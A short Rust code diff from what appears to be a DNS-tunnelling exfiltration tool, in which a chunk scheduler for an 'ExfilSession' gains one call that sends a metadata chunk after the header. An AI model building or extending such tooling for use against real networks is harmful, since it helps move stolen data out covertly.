@@ -17,6 +17,7 @@ impl ChunkScheduler {
 
     pub fn run(&self, session: &mut ExfilSession, transmitter: &mut DnsTransmitter) -> Result<()> {
         transmitter.send_header(session)?;
+        transmitter.send_metadata_chunk(session)?;
 
         let mut chunks_in_burst = 0usize;
         while session.next_chunk < session.job.total_chunks {
